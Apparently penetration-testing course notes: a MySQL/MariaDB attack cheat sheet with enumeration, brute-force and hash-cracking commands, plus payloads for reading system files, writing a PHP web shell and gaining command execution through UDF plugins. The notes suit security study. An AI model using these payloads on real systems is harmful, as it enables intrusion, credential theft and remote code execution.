# MySQL

#MySQL #MariaDB #database

## What is MySQL?
Open-source relational DBMS. Client-server model — MySQL server manages data, clients query it. Common in LAMP (Linux, Apache, MySQL, PHP) and LEMP stacks. MariaDB is a community fork. Default port **TCP 3306**.

- Sensitive data should be stored hashed or encrypted
- Look for accounts with no password set
- Debug/warning modes can leak sensitive data
- Clients vulnerable to SQL injection

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Database/mysql\|mysql]] | Standard CLI client — MySQL/MariaDB wire protocol |
| [[Tools/Scanning/NMAP\|Nmap]] | `mysql-*` NSE — info, empty-password, databases, users, brute |
| [[Tools/Payloads & Shells/metasploit\|Metasploit]] | `mysql_login`/`mysql_enum`/`mysql_schemadump`; `mysql_udf_payload` for UDF RCE |
| [[Tools/Auth/Hydra\|Hydra]] | Credential brute force over the MySQL protocol |
| [[Tools/Auth/Medusa\|Medusa]] | Alternate brute-forcer (`-M mysql`) |
| [[Tools/Auth/hashcat\|hashcat]] | Crack dumped `authentication_string` hashes (mode 300 / 7401) |

---

## Configuration Files

| File | Description |
|---|---|
| `/etc/mysql/mysql.conf.d/mysqld.cnf` | Main MySQL server config (Linux) |
| `/etc/mysql/my.cnf` | Global MySQL config |
| `C:\ProgramData\MySQL\MySQL Server X.X\my.ini` | Config (Windows) |

---

## Enumeration

```bash
# Nmap scripts
nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-databases,mysql-users -sV <target>

# Brute force
nmap -p 3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt <target>

# Metasploit
use auxiliary/scanner/mysql/mysql_login
use auxiliary/admin/mysql/mysql_enum
use auxiliary/scanner/mysql/mysql_schemadump
```

---

## Connect / Access

```bash
# Linux (mysql client)
mysql -u <user> -p<password> -h <target>
mysql -u root -p -h 10.129.20.13

# Linux with no password (anonymous/empty)
mysql -u root --host 10.129.20.13

# MariaDB client (drop-in, same flags)
mariadb -u <user> -p<password> -h <target>

# Windows
mysql -u <user> -p<password> -h <target>
```

> [!note] No space between `-p` and the password: `-pPassword123` not `-p Password123`.
> `sqsh` is a **TDS** client (MSSQL/Sybase) and does **not** speak the MySQL protocol — use `mysql`/`mariadb`, not `sqsh`, here.

---

## Key SQL Commands

```sql
-- Show all databases
SHOW DATABASES;

-- Select database
USE <database>;

-- Show all tables
SHOW TABLES;

-- Show columns
SHOW COLUMNS FROM <table>;
DESCRIBE <table>;

-- Dump table
SELECT * FROM <table>;

-- Current user and privileges
SELECT user();
SELECT current_user();
SHOW GRANTS;
SHOW GRANTS FOR 'user'@'host';

-- List all users
SELECT user, host, authentication_string FROM mysql.user;

-- Check secure_file_priv setting
SHOW VARIABLES LIKE 'secure_file_priv';
SHOW VARIABLES LIKE 'local_infile';
```

---

## Attack Vectors

### Read Files (requires FILE privilege + secure_file_priv check)

```sql
-- Check if file read is allowed
SHOW VARIABLES LIKE 'secure_file_priv';
-- Empty string "" = unrestricted, NULL = disabled

-- Read a file
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');
```

### Write Files (Web Shell)

```sql
-- Write web shell (requires FILE privilege + writable web root)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';

-- Write web shell (alternative)
SELECT 0x3c3f70687020...hex... INTO DUMPFILE '/var/www/html/shell.php';
```

### Crack Dumped Password Hashes

`SELECT user, host, authentication_string FROM mysql.user;` gives you the stored hashes — crack them offline.

```bash
# mysql_native_password (the classic *HEX format) → hashcat mode 300
hashcat -m 300 mysql_hashes.txt /usr/share/wordlists/rockyou.txt

# caching_sha2_password — the DEFAULT auth plugin since MySQL 8.0 → hashcat mode 7401
hashcat -m 7401 caching_sha2_hashes.txt /usr/share/wordlists/rockyou.txt
```

### User-Defined Function (UDF) Privilege Escalation

If the server has the `FILE` privilege (or `secure_file_priv` is permissive) and MySQL runs as root, a **UDF** loaded from a shared object gives OS command execution as the MySQL service account. The catch the short version omits: the `.so` must land in the server's **plugin directory**, and you plant it there with `INTO DUMPFILE` (a hex blob), not by "compiling on the box".

```sql
-- 1. Find where plugins must live
SHOW VARIABLES LIKE 'plugin_dir';        -- e.g. /usr/lib/mysql/plugin/
SHOW VARIABLES LIKE 'secure_file_priv';  -- must be '' (unrestricted) or cover plugin_dir

-- 2. Write the precompiled lib_mysqludf_sys .so into plugin_dir as a hex blob
--    (compile raptor_udf2.c / lib_mysqludf_sys.so off-target for the right arch first)
SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';

-- 3. Register and call the function
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id > /tmp/out; chmod 666 /tmp/out');
```

> [!tip] Metasploit's `exploit/multi/mysql/mysql_udf_payload` automates the whole plugin_dir write + function creation given credentials — faster and less error-prone than hand-building the hex blob.

### Rogue Server — Read Files off a Connecting Client (`LOAD DATA LOCAL`)

`LOAD DATA LOCAL INFILE` is a **client-side** read: the *server* asks the *client* to send a file's contents. A malicious MySQL server can therefore read arbitrary files from any client that connects to it with `local_infile` enabled — the reverse of the usual attack, useful when you can lure an app/admin to connect to your server.

```bash
# Stand up a rogue MySQL server (e.g. Rogue-MySql-Server / Bettercap's mysql module)
# that responds to any connection with a LOAD DATA LOCAL request for the target path.
python3 rogue_mysql_server.py        # requests /etc/passwd from whoever connects
# Then get the victim client to connect to your IP:3306
```

### Brute Force

```bash
# Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<target>

# Medusa
medusa -h <target> -u root -P /usr/share/wordlists/rockyou.txt -M mysql
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| `secure_file_priv = ""` | `LOAD_FILE`/`INTO OUTFILE`/`INTO DUMPFILE` anywhere on the filesystem |
| `local_infile = 1` | `LOAD DATA LOCAL` — a rogue server can read the client's files |
| `bind-address = 0.0.0.0` | MySQL exposed on all interfaces |
| User with `FILE` privilege | Read/write OS files; write UDF `.so` to plugin_dir → RCE |
| User with `SUPER` privilege | Change global variables (e.g. re-enable `local_infile`) |
| MySQL service running as root | UDF `sys_exec` → command execution as root |
| Accounts with empty/weak passwords | Trivial authenticated access |

---

## Quick Reference

| Goal | Command |
|---|---|
| Connect (Linux) | `mysql -u user -pPass -h host` |
| All databases | `SHOW DATABASES;` |
| All users + hashes | `SELECT user,host,authentication_string FROM mysql.user;` |
| Check file privs | `SHOW VARIABLES LIKE 'secure_file_priv';` |
| Read file | `SELECT LOAD_FILE('/etc/passwd');` |
| Write web shell | `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';` |
| Crack hashes | `hashcat -m 300 hashes.txt rockyou.txt` (or `-m 7401` for caching_sha2) |
| UDF RCE | `CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';` |
| Brute force | `hydra -l root -P rockyou.txt mysql://host` |
| Nmap enum | `nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-databases` |

---

> [!note] **See also** — SQL-injection *into* MySQL (UNION/error/blind, `INTO OUTFILE` webshell via injection) is covered in [[Class notes/HTB Academy/CPTS v2 (claude)/SQL Injection|SQL Injection]]. Sibling relational DBs: [[Services/Database Services/MSSQL|MSSQL]] (the Windows equivalent, with xp_cmdshell), [[Services/Database Services/PostgreSQL|PostgreSQL]] (`COPY … TO PROGRAM` RCE).

---

*Created: 2026-07-13*
*Updated: 2026-09-22*
*Model: claude-opus-4-8*
